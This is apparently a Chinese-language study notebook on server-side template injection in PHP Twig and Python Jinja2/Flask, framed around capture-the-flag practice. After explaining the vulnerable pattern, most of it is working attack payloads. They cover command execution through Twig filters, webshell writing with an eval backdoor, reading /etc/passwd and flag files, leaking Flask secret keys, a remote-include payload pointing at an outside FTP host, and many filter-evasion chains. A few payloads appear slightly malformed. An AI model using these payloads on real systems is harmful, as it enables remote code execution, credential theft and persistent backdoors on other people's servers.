# PHP安全学习—Twig模板引擎SSTI注入
[1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园](https://www.cnblogs.com/bmjoker/p/13508538.html)
Author: H3rmesk1t

# 模板引擎
模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。

模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。

![[Pasted image 20251015210434.png]]

# 模板注入

SSTI 就是服务器端模板注入（Server-Side Template Injection）

当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。

漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。

凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。
# Twig

## 简介
> 1. Twig 是一个灵活、快速、安全的 PHP 模板语言，它将模板编译成经过优化的原始 PHP 代码
> 2. Twig 拥有一个 Sandbox 模型来检测不可信的模板代码
> 3. Twig 由一个灵活的词法分析器和语法分析器组成，可以让开发人员定义自己的标签，过滤器并创建自己的 DSL
> 4. Twig 被许多开源项目使用，比如 Symfony、Drupal8、eZPublish、phpBB、Matomo、OroCRM；许多框架也支持 Twig，比如 Slim、Yii、Laravel 和 Codeigniter 等等

## 安装
> 推荐使用 composer 来进行安装

```bash
composer require "twig/twig:^3.0"
```

> 安装之后直接使用 Twig 的 PHP API 进行调用即可，下面看一个测试代码

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello {{ name }}!',
]);
$twig = new \Twig\Environment($loader);

echo $twig->render('index', ['name' => 'whoami']);
```
> 上述代码中 Twig 首先使用一个加载器 Twig_Loader_Array 来定位模板，然后使用一个环境变量 Twig_Environment 来存储配置信息，其中 render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板；由于模板文件通常存储在文件系统中，Twig 还附带了一个文件系统加载程序

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\FilesystemLoader('./views');
//$loader = new \Twig\Loader\FilesystemLoader('./templates');
$twig = new \Twig\Environment($loader, [
    'cache' => './cache/views',    // cache for template files
]);

echo $twig->render('index.html', ['name' => 'whoami']);
```

## Twig 模板的基础语法
> 模板实际就是一个常规的文本文件，它可以生成任何基于文本的格式(HTML、XML、CSV、LaTeX等)，它没有特定的扩展名：.html、.xml、.twig 都行
> 模板包含变量或表达，在评估编译模板时这些带值的变量或表达式会被替换，还有一些控制模板逻辑的标签 tags
> 下面是一个非常简单的模板

```html
<!DOCTYPE html>
<html>
    <head>
        <title>My Webpage</title>
    </head>
    <body>
        <ul id="navigation">
        {% for item in navigation %}
            <li><a href="{{ item.href }}">{{ item.caption }}</a></li>
        {% endfor %}
        </ul>

        <h1>My Webpage</h1>
        {{ a_variable }}
    </body>
</html>
```

> 从上面的代码中可以看出，有两种形式的分隔符：{% ... %} 和 {{ ... }}，前者用于执行语句 (例如 for 循环)，后者用于将表达式的结果输出到模板中

### 变量
> 应用程序将变量传入模板中进行处理，变量可以包含能访问的属性或元素，可以使用 `.` 来访问变量中的属性 (方法或 PHP 对象的属性或 PHP 数组单元)，也可以使用所谓的 "subscript" 语法 `[]`

```php
{{ foo.bar }}
{{ foo['bar'] }}
```

### 设置变量
> 可以为模板代码块内的变量赋值，赋值使用 set 标签

```php
{% set foo = 'foo' %}
{% set foo = [1, 2] %}
{% set foo = {'foo': 'bar'} %}
```

### 过滤器
> 可以通过过滤器 `filters` 来修改模板中的变量，在过滤器中变量与过滤器或多个过滤器之间使用 `|` 分隔，还可以在括号中加入可选参数来连接多个过滤器，其中一个过滤器的输出结果将用于下一个过滤器中，[Twig 内置过滤器参考链接](https://twig.symfony.com/doc/3.x/filters/index.html)

```php
# 下面这个过滤器的例子会剥去字符串变量 name 中的 HTML 标签然后将其转化为大写字母开头的格式

{{ name|striptags|title }}
// {{ '<a>whoami<a>'|striptags|title }}
// Output: Whoami!

# 下面这个过滤器将接收一个序列 list 然后使用 join 中指定的分隔符将序列中的项合并成一个字符串

{{ list|join }}
{{ list|join(', ') }}
// {{ ['a', 'b', 'c']|join }}
// Output: abc
// {{ ['a', 'b', 'c']|join('|') }}
// Output: a|b|c
```

### 函数
> 在 Twig 模板中可以直接调用函数用于生产内容，[Twig 内置函数参考链接](https://twig.symfony.com/doc/3.x/functions/index.html)

```php
# 如下调用了 range() 函数用来返回一个包含整数等差数列的列表

{% for i in range(0, 3) %}
    {{ i }},
{% endfor %}
// Output: 0, 1, 2, 3,
```

### 控制结构
> 控制结构是指控制程序流程的所有控制语句 if、elseif、else、for 以及程序块等等，控制结构出现在 {% ... %} 块中，[Twig Tags参考链接](https://twig.symfony.com/doc/3.x/tags/index.html)

```php
# 例如使用 for 标签进行循环

<h1>Members</h1>
<ul>
    {% for user in users %}
        <li>{{ user.username|e }}</li>
    {% endfor %}
</ul>

# if 标签可以用来测试表达式

{% if users|length > 0 %}
    <ul>
        {% for user in users %}
            <li>{{ user.username|e }}</li>
        {% endfor %}
    </ul>
{% endif %}
```

### 注释
> 要在模板中注释某一行可以使用注释语法 {# ...#}

```php
{# note: disabled template because we no longer use this
    {% for user in users %}
        ...
    {% endfor %}
#}
```

### 引入其他模板
> Twig 提供的 include 函数可以使你更方便地在模板中引入模板并将该模板已渲染后的内容返回到当前模板

```php
{{ include('sidebar.html') }}
```

## Twig 模板注入
> 和其他的模板注入一样 Twig 模板注入也是发生在直接将用户输入作为模板

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}!");

echo $template->render();
```

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello {{ name }}!',
]);
$twig = new \Twig\Environment($loader);

echo $twig->render('index', ['name' => 'whoami']);
```

> 上述第一段代码中 createTemplate 时注入了 `$_GET['name']`，此时就会引发模板注入，而第二段代码则不会，因为模板引擎解析的是字符串常量中的 `{{name}}`，而不是动态拼接的 `$_GET["name"]`

### Twig 1.x
> 测试代码如下

```php
<?php

include __DIR__.'/vendor/twig/twig/lib/Twig/Autoloader.php';
Twig_Autoloader::register();

$loader = new Twig_Loader_String();
$twig = new Twig_Environment($loader);
echo $twig->render($_GET['name']);
?>
```

> 在 Twig 1.x 中存在三个全局变量
```php
_self：引用当前模板的实例
_context：引用当前上下文
_charset：引用当前字符集
```

> 对应的代码是

```php
protected $specialVars = [
        '_self' => '$this',
        '_context' => '$context',
        '_charset' => '$this->env->getCharset()',
    ];
```
> 这里主要就是利用 `_self` 变量，它会返回当前 `\Twig\Template` 实例并提供了指向 `Twig_Environment` 的 `env` 属性，这样就可以继续调用 `Twig_Environment` 中的其他方法从而进行 SSTI
> 例如以下 Payload 可以调用 `setCache` 方法改变 Twig 加载 PHP 文件的路径，在 `allow_url_include` 开启的情况下可以通过改变路径实现远程文件包含

```php
{{_self.env.setCache("ftp://attackTarget:1234")}}{{_self.env.loadTemplate("backdoor")}}
```

> 还有 getFilter 方法中的 `call_user_func` 方法，Payload：`{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("calc.exe")}}` (但是在 Twig2.x 及 Twig3.x 以后 `_self` 的作用发生了变化，只能返回当前实例名字符串，故该 Payload 只对 Twig1.x 适用)

```php
public function getFilter($name)
    {
        if (null === $this->filters) {
            $this->loadFilters();
        }

        if (isset($this->filters[$name])) {
            return $this->filters[$name];
        }

        foreach ($this->filterCallbacks as $callback) {
            if (false !== $filter = call_user_func($callback, $name)) {
                return $filter;
            }
        }

        return false;
    }
```

<img src="./images/1.png" alt="">

### Twig 2.x && Twig 3.x
> 测试代码

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}!");

echo $template->render();
```

> 到了 Twig 2.x / 3.x 版本中的 `__self` 变量在 SSTI 中早已失去了它的作用，但可以借助新版本中的一些过滤器实现攻击目的

#### map 过滤器
> 在 Twig 3.x 中的 map 过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素

```php
{% set people = [
    {first: "Bob", last: "Smith"},
    {first: "Alice", last: "Dupond"},
] %}

{{ people|map(p => "#{p.first} #{p.last}")|join(', ') }}
// Output: outputs Bob Smith, Alice Dupond


{% set people = {
    "Bob": "Smith",
    "Alice": "Dupond",
} %}

{{ people|map((last, first) => "#{first} #{last}")|join(', ') }}
// Output: outputs Bob Smith, Alice Dupond
```

> 当如下使用 map 时

```php
{{["Mark"]|map((arg)=>"Hello #{arg}!")}}
```

> Twig 3.x 会将其编译成

```php
twig_array_map([0 => "Mark"], function ($__arg__) use ($context, $macros) { $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))})
```

> 来看看源码中这个方法是怎么执行的

```php
function twig_array_map($array, $arrow)
{
    $r = [];
    foreach ($array as $k => $v) {
        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
    }

    return $r;
}
```

> 从上面的代码中可以看到传入的 `$arrow` 直接就被当成函数执行，即 `$arrow($v, $k)`，而 `$v` 和 `$k` 分别是 `$array` 中的 `value` 和 `key`
> 并且 `$array` 和 `$arrow` 都是可控的，因此直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行

```php
system ( string $command [, int &$return_var ] ) : string
passthru ( string $command [, int &$return_var ] )
exec ( string $command [, array &$output [, int &$return_var ]] ) : string
shell_exec ( string $cmd ) : string
```

> 上述四个方法可以达到命令执行的有前三个，并且 exec 是无回显执行

```php
{{["calc"]|map("system")}}
{{["calc"]|map("passthru")}}
{{["calc"]|map("exec")}}    // 无回显
```

> 如果上面这些命令执行函数都被禁用了还可以执行其他函数执行任意代码

```php
{{["phpinfo();"]|map("assert")|join(",")}}
{{{"<?php phpinfo();eval($_POST[H3rmesk1t]);":"/var/www/html/shell.php"}|map("file_put_contents")}}    // 写 Webshell
```

> 既然 map 的 `$arrow` 可以利用，那继续寻找带有 $arrow 参数的应该也可以发现可以利用的过滤器

#### sort 过滤器
> 这个 sort 筛选器可以用来对数组排序，可以传递一个箭头函数来对数组进行排序

```php
{% for user in users|sort %}
    ...
{% endfor %}


{% set fruits = [
    { name: 'Apples', quantity: 5 },
    { name: 'Oranges', quantity: 2 },
    { name: 'Grapes', quantity: 4 },
] %}

{% for fruit in fruits|sort((a, b) => a.quantity <=> b.quantity)|column('name') %}
    {{ fruit }}
{% endfor %}

// Output in this order: Oranges, Grapes, Apples
```

> 类似于 map，模板编译的过程中会进入 twig_sort_filter 函数，这个 twig_sort_filter 函数的源码如下

```php
function twig_sort_filter($array, $arrow = null)
{
    if ($array instanceof \Traversable) {
        $array = iterator_to_array($array);
    } elseif (!\is_array($array)) {
        throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));
    }

    if (null !== $arrow) {
        uasort($array, $arrow);    // 直接被 uasort 调用 
    } else {
        asort($array);
    }

    return $array;
}
```

> 从源码中可以看到，`$array` 和 `$arrow` 直接被 `uasort` 函数调用，由于 `uasort` 函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果自定义一个危险函数将造成代码执行或命令执行

<img src="./images/2.png" alt="">

> Payload

```php
{{["calc", 0]|sort("system")}}
{{["calc", 0]|sort("passthru")}}
{{["calc", 0]|sort("exec")}}    // 无回显
```

#### filter 过滤器
> 这个 filter 过滤器使用箭头函数来过滤序列或映射中的元素，箭头函数用于接收序列或映射的值

```php
{% set lists = [34, 36, 38, 40, 42] %}
{{ lists|filter(v => v > 38)|join(', ') }}

// Output: 40, 42
```

> 类似于 map，模板编译的过程中会进入 `twig_array_filter` 函数，这个 `twig_array_filter` 函数的源码如下

```php
function twig_array_filter($array, $arrow)
{
    if (\is_array($array)) {
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
    }

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
}
```

> 从源码中可以看到 `$array` 和 `$arrow` 直接被 `array_filter` 函数调用，`array_filter` 函数可以用回调函数过滤数组中的元素，如果自定义一个危险函数将造成代码执行或命令执行

<img src="./images/3.png" alt="">

> Payload

```php
{{["calc"]|filter("system")}}
{{["calc"]|filter("passthru")}}
{{["calc"]|filter("exec")}}    // 无回显
{{{"<?php phpinfo();eval($_POST[H3rmesk1t]);":"/var/www/html/shell.php"}|filter("file_put_contents")}}    // 写 Webshell
```

#### reduce 过滤器
> 这个 reduce 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值，箭头函数接收上一次迭代的返回值和序列或映射的当前值

```php
{% set numbers = [1, 2, 3] %}
{{ numbers|reduce((carry, v) => carry + v) }}
// Output: 6
```

> 类似于 map，模板编译的过程中会进入 `twig_array_reduce` 函数，这个 `twig_array_reduce` 函数的源码如下

```php
function twig_array_reduce($array, $arrow, $initial = null)
{
    if (!\is_array($array)) {
        $array = iterator_to_array($array);
    }

    return array_reduce($array, $arrow, $initial);    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
}
```

> 从源码中可以看到 `$array` 和 `$arrow` 直接被 `array_filter` 函数调用，`array_reduce` 函数可以发送数组中的值到用户自定义函数并返回一个字符串，如果自定义一个危险函数将造成代码执行或命令执行

> Payload

```php
{{[0, 0]|reduce("system", "calc")}}
{{[0, 0]|reduce("passthru", "calc")}}
{{[0, 0]|reduce("exec", "calc")}}    // 无回显
```



## 常见payload

```c
{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{["id"]|map("system")|join(",")
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{["id",0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0,0]|reduce("system","id")|join(",")}}
{{['cat /etc/passwd']|filter('system')}}



```

# python

## 0x01 成因
```python
from flask import Flask, request, render_template_string
from jinja2 import Template
app = Flask(__name__)

@app.route('/')
def main():
    name = request.args.get('name')
    t = '''  
        <html>
            <h1>Hello my dear %s</h1>
        </html>
        ''' % (name)
    return render_template_string(t)








from flask import Flask, request, render_template_string
from jinja2 import Template
app = Flask(__name__)

@app.route('/')
def main():
    name = request.args.get('name')
    t = Template'''  
        <html>
            <h1>Hello my dear %s</h1>
        </html>
        ''' % (name)
    return t.render()


```

当传入name为正常的字符串，比如LamentXU，就会返回Hello my dear LamentXU。一切多么美好（bushi）

但是，如果我们输入{{7\*7}}就会返回49
这是因为，用户的输入被直接拼接到渲染Template里去了，而在Template里，你是可以用{{}}或{\%%}执行python代码的！
然而，以下代码就不会出现问题：
```python

from flask import Flask, request, render_template
app = Flask(__name__)

@app.route('/')
def main():
    name = request.args.get('name')
    return render_template('index.html', name=name)

app.run()


```


## 0x02 漏洞特征

**直接将用户输入通过字符串拼接合并到模板里渲染的python jinja2后端容易出现由SSTI引起的RCE**

当然，其他python模板也大差不差，现学现卖就行。然而其他语言的模板可能会有较大差距，不过核心思想不变，都是由服务器无过滤无检查地直接将用户的输出拼接到模板中导致的。

漏洞必须带有以下特征：

- 存在`render_template`或`render_template_string`函数
- 存在直接将用户可控的输入使用字符串拼接的方法传入上述函数中的行为
- 没有过度严格的过滤（如过滤单个大括号符`}`，`{`或存在于沙箱环境中），然而，具体情况具体分析，有些题目内是可以绕过这些过滤的

POC: {{7*7}} 如果返回49就确诊SSTI了

## 0x03 利用

确诊SSTI后，我们主要有两个思路：

- XSS
- RCE

###  XSS

XSS这个比较好理解，毕竟是直接拼接用户输入到渲染里。跟一般的xss题目差距不是很大，不展开细讲。这里直接给个例子。
```python
from flask import Flask, request, render_template_string
from jinja2 import Template
app = Flask(__name__)

@app.route('/')
def main():
    name = request.args.get('name')
    t = '''  
        <html>
            <h1>Hello my dear %s</h1>
        </html>
        ''' % (name)
    return render_template_string(t)

```

就这一段漏洞代码来说，如果给name传参`<script>alert(1)</script>`将会成功xss

这里我更喜欢用一个自己定义的词汇来描述：“上级漏洞”。可以说：有SSTI的地方一定有XSS，但有XSS的地方不一定有SSTI（我喜欢把SSTI叫成XSS的上级）。所以，尤其在黑盒审计中，当发现一处存在XSS而又没什么利用点时（尤其是反射型的XSS）优先考虑SSTI



###  RCE

我们都知道，在确诊了SSTI漏洞后可以有一个等效于python中eval()的sink点，那么就可以把eval的那一套搬过来。问题是，没有服务器会蠢到帮你导入os，sys这种危险库，还得靠你自己导入。

首先，如果你的目标是flask app的配置信息（如SECRET_KEY）或者服务器的环境变量，那么恭喜你可以直接出了。
```
{{config}}		# 获取config，包含secret_key
{{request.environ}}	# 获取环境信息

```
如果你的目标是读取flag文件的话，那么我们的最终目标是找到并导入os库，使用system或者popen这种危险函数来读取。当然，你也可以导入pickle库来反弹shell
我们的思路也很明显：

- 使用万能的对象（比如字符串对象''）-> 子类 -> 基类 -> 危险类的危险函数（大多数情况）
- 直接使用代码中定义的对象（包括已经导入的库）所包含的危险子类中的危险函数（比如说R3CTF那道题）

#### 1.使用万能的对象

这里说是“万能的对象”，其实大多数情况下，最好用最经典的还是字符串对象''，当然[]这些对象也是可以的

python中每个对象都有个属性`__class__`，用于返回该对象所属的类。而我们要做的，就是**获取到object基类**（可以理解为世界的开端（bushi）是一切类的父类）

**使用`''.__class__`我们就完成了第一步，即，获取到一个字符串对象**![[Pasted image 20250930105049.png]]
当然[]也可以（{},()也行）
![[Pasted image 20250930105100.png]]
还有：

`__bases__`：以元组的形式返回一个类所直接继承的类。

`__base__`：以字符串形式返回一个类所直接继承的类。

`__mro__`：返回解析方法调用的顺序。

这三个属于获取基类的办法。获取到object基类之后，因为这个基类的子类是这个python程序目前的所有类，所以可以直接找到我们要的os（是基类的一个子类）

**使用`"".__class__.__bases__`或`"".__class__.__mro__[1]`或`"".__class__.__base__`我们就完成了第二步，即，获取到了object基类，也就是世界的开端（bushi）**

一个纯净的python3.9中继承了object基类的类如下：
![[Pasted image 20250930105115.png]]


`__subclasses__()`：获取类的所有子类。

`__init__`：所有自带带类都包含init方法，便于利用他当跳板来调用globals。

`function.__globals__`，用于获取function所处空间下可使用的module、方法以及所有变量。

我们要做的，是找到使用os的内置类。那这可多了，这里可以fuzz出（由python环境改变而改变）如果没有的话，也可以找一些可以读取文件的内置类，那么_warnings.catch_warnings_类可就成重灾区了（有很多其他的）

我们发现object基类的__subclasses__()中**<type 'warnings.catch_warnings'>**的索引值为138（随环境改变而改变），导入他后直接导入os并RCE即可

```scss
[].__class__.__base__.__subclasses__()[138].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")

```
当然，你也可以找到其他调用了os的内置类，利用`__init__`和`function.__globals__`来调用内置类中os类的方法，如subprocess.popen：
```scss
{{"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["popen"]("whoami").read()}}

```

有用的python内置类有很多，这里贴一个佬的脚本，可以直接把subclass出来的东西放data里帮你检测有用的类的索引，也是我做题经常用的脚本（出自https://www.cnblogs.com/tuzkizki/p/15394415.html#%E6%9E%84%E9%80%A0payload）
```python
import re # 将查找到的父类列表替换到data中 
data = r''' [<class 'type'>, <class 'weakref'>, ......] ''' 
# 在这里添加可以利用的类，下面会介绍这些类的利用方法 
userful_class = ['linecache', 'os._wrap_close', 'subprocess.Popen', 'warnings.catch_warnings', '_frozen_importlib._ModuleLock', '_frozen_importlib._DummyModuleLock', '_frozen_importlib._ModuleLockManager', '_frozen_importlib.ModuleSpec'] 
pattern = re.compile(r"'(.*?)'") 
class_list = re.findall(pattern, data) 
for c in class_list: 
    for i in userful_class: 
        if i in c: 
            print(str(class_list.index(c)) + ": " + c)

```
做题流程也很明确了：确定好要用SSTI打RCE之后用burp（payload：`"".__class__.__mro__[1].__subclasses__()`）fuzz服务器找os或者file，然后读取文件或RCE


**总结一下就是：先找object基类，然后subclasses出所有的类（就应该是一大坨玩意）然后放上面那个脚本里跑索引。找到能用的类之后去网上找这个类对应的payload打就完了（上面展示了两个）**


#### 2.直接使用代码中定义的对象

可以先看一下R3CTF 中jinjaclub的wp（上文里有链接）。方便你更好理解。

这种情况比较稀有，在沙箱环境内，你无法找到object基类。但是你仍然可以使用程序空间内已经定义好的对象。这里建议在你的IDE里开断点调试。看看程序内的对象里有没有引用到什么类，而这些类有没有引用到一些危险类或有没有危险函数。这需要一些osint的内容（你要去看这些引用到的类的开发手册，等等）

在R3CTF的例子中User类由于继承了pydantic的BaseModel，而BaseModel中有一个parse_raw函数里有一个proto参数和allow_pickle参数可以解析pickle。可以上传恶意pickle文件弹shell打RCE。

过程也很明确。F5在请求函数第一行处断点，ctrl+B对着可以引用的对象一个一个瞪就能瞪出来。

下图为R3CTF那个题的调试截图![[Pasted image 20250930105403.png]]

## 0x04 常见防护及绕过

### request.args逃逸

如果题目中没有过滤request，则可以将一些含有敏感字符的位置用get传，再在SSTI中用request.args.arg1逃逸到get参数里去

```bash
a=__globals__&b=os&c=cat /flag&sentence=%print (lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()
```

### `{%%}` 代替 `{{}}`

{\%%}在jinja2里与{{}}充当相似的角色，都可以来SSTI（bushi）

### .getitem代替[]

python中[]与.是相同的

所以如果过滤了[]的话可以用.getitem

```cpp
tuple[0] == tuple.getitem(0)


//gpt说要写成tuple.__getitem__(0)



t = (10, 20, 30)

# 正常索引
print(t[0])  

# 用 __getitem__ 绕过 []
print(t.__getitem__(0))  


```

python特性解决

### []代替.

python里对象的特性

```ini
a.b == a['b']
```

### 字符串合并

```bash
"__glo"+"bal__" == "__global__"
```

鉴于SSTI类似于eval的特性，可以使用字符串相加绕过对一整个字符串的检测

### chr绕过

可以用找os类相同的办法找chr类，再用chr类构造字符串

**接下来说SSTI漏洞比较害怕什么过滤**

- 单个大括号字符`{`, `}`，有就死（（
- 单个小括号字符`(`,`)`，有的话只能看config或者环境变量了


--------------------------------------------------------------------
## 另一个博客的常见绕过

#### 过滤单双引号

- 通过request传参绕过（过滤命令时可用，当然，一般是不会起这么嚣张的参数名的[doge]）
```python
# request.values
{{"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen(request.values.rce).read()}}&rce=cat /flag
# request.cookies
{{"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen(request.cookies.rce).read()}}
Cookie: rce=cat /flag;
# 还有request.headers、request.args，这里不作演示
```

- 获取chr函数，赋值给chr，拼接字符串

```python
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
# %2b是+的url转义
{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}
```

#### 过滤中括号

```python
# 原payload，可以使用__base__绕过__bases__[0]
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()
# 通过__getitem__()绕过__bases__[0]、通过pop(128)绕过__subclasses__()[128]
"".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globals__.popen('whoami').read()

# 原payload
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")
# 绕过
[].__class__.__base__.__subclasses__().__getitem__(59).__init__.__globals__.__builtins__.eval("__import__('os').popen('whoami').read()")
```

#### 过滤双下划线

```python
# request妙用，绕过
{{''[request.args.a][request.args.b][2][request.args.c]()}}&a=__class__&b=__mro__&c=__subclasses__

# request传参绕过
# request.args
{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
# request.cookies
{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}
Cookie: class=__class__; mro=__mro__; subclasses=__subclasses__;
# 还有request.headers、request.args
```
#### 过滤关键字

- 拼接字符串
```python
'o'+'s'
'sy' + 'stem'
'fl' + 'ag'
```


- 编码：Base64、rot13、16进制......
    
- 大小写绕过
    
- 过滤config
```python
# 绕过，同样可以获取到config
{{self.dict._TemplateReference__context.config}}
```
#### 过滤双花括号
{% + print绕过

```python
{%print(''.__class__.__base__.__subclasses__()[138].__init__.__globals__.popen('whoami').read())%}
```

#### 通用getshell

- 过滤引号、中括号

```python
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(250).__init__.__globals__.__builtins__.chr %}{% for c in ().__class__.__base__.__subclasses__() %} {% if c.__name__==chr(95)%2bchr(119)%2bchr(114)%2bchr(97)%2bchr(112)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(111)%2bchr(115)%2bchr(101) %}{{ c.__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read() }}{% endif %}{% endfor %}
```

过滤引号、中括号、下划线
```python
# 使用getlist，获取request的__class__
{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
# 拆解一下，等价于下列payload
{{request|attr('__class__')}}
{{request['__class__']}}
{{request.__class__}}

# 获取__object__
{{request|attr(request.args.getlist(request.args.l1)|join)|attr(request.args.getlist(request.args.l2)|join)|attr(request.args.getlist(request.args.l2)|join)|attr(request.args.getlist(request.args.l2)|join)}}&l1=a&a=_&a=_&a=class&a=_&a=_&l2=b&b=_&b=_&b=base&b=_&b=_
# 通过flask类获取会更快
{{flask|attr(request.args.getlist(request.args.l1)|join)|attr(request.args.getlist(request.args.l2)|join)}}&l1=a&a=_&a=_&a=class&a=_&a=_&l2=b&b=_&b=_&b=base&b=_&b=_
```



过滤引号、中括号、下划线、花括号（**综合大应用**），可能会有一点点复杂：）

```python
# 打印子类并找到可以利用的类
{%print(flask|attr(request.args.getlist(request.args.l1)|join)|attr(request.args.getlist(request.args.l2)|join)|attr(request.args.getlist(request.args.l3)|join)())%}&l1=a&a=_&a=_&a=class&a=_&a=_&l2=b&b=_&b=_&b=base&b=_&b=_&l3=c&c=_&c=_&c=subclasses&c=_&c=_

# 然后稍微加一点难度
# 目录-寻找可利用类 中用到的脚本跑一下，得到os._wrap_close的序号为138（这里用这个类来演示），于是：
{%print(flask|attr(request.args.getlist(request.args.l1)|join)|attr(request.args.getlist(request.args.l2)|join)|attr(request.args.getlist(request.args.l3)|join)()|attr(request.args.getlist(request.args.l4)|join)(138)|attr(request.args.getlist(request.args.l5)|join)|attr(request.args.getlist(request.args.l6)|join)).popen(request.args.rce).read()%}&l1=a&a=_&a=_&a=class&a=_&a=_&l2=b&b=_&b=_&b=base&b=_&b=_&l3=c&c=_&c=_&c=subclasses&c=_&c=_&l4=d&d=_&d=_&d=getitem&d=_&d=_&l5=e&e=_&e=_&e=init&e=_&e=_&l6=f&f=_&f=_&f=globals&f=_&f=_&rce=whoami
# 等价于
{{''.__class__.__base__.__subclasses__()[138].__init__.__globals__.popen('whoami').read()}}
```

##  python SSTI payload查询

```python
# 利用warnings.catch_warnings配合__builtins__得到eval函数，直接梭哈（常用）
{{[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()}}

# 利用os._wrap_close类所属空间下可用的popen函数进行RCE的payload
{{"".__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}
{{"".__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}

# 利用subprocess.Popen类进行RCE的payload
{{''.__class__.__base__.__subclasses__()[479]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}

# 利用__import__导入os模块进行利用
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}

# 利用linecache类所属空间下可用的os模块进行RCE的payload，假设linecache为第250个子类
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}
{{[].__class__.__base__.__subclasses__()[250].__init__.func_globals['linecache'].__dict__.['os'].popen('whoami').read()}}

# 利用file类（python3将file类删除了，因此只有python2可用）进行文件读
{{[].__class__.__base__.__subclasses__()[40]('etc/passwd').read()}}
{{[].__class__.__base__.__subclasses__()[40]('etc/passwd').readlines()}}
# 利用file类进行文件写（python2的str类型不直接从属于属于基类，所以要两次 .__bases__）
{{"".__class__.__bases[0]__.__bases__[0].__subclasses__()[40]('/tmp').write('test')}}

# 通用getshell，都是通过__builtins__调用eval进行代码执行
